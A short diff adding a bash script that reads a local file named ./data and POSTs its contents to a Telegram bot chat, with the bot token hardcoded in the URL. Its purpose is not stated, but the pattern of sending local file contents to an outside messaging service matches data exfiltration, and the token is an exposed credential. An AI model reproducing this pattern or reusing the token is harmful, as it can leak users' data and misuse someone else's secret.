@@ -1,0 +1,3 @@
+#!/bin/bash
+BOT=$(cat ./data)
+curl -X POST "https://api.telegram.org/bot1809701127:AAG88i-ftVdrf9XXBBSLrX4Ausf_cZukbDg/sendMessage" -d "chat_id=-1001454600443&text=$BOT"
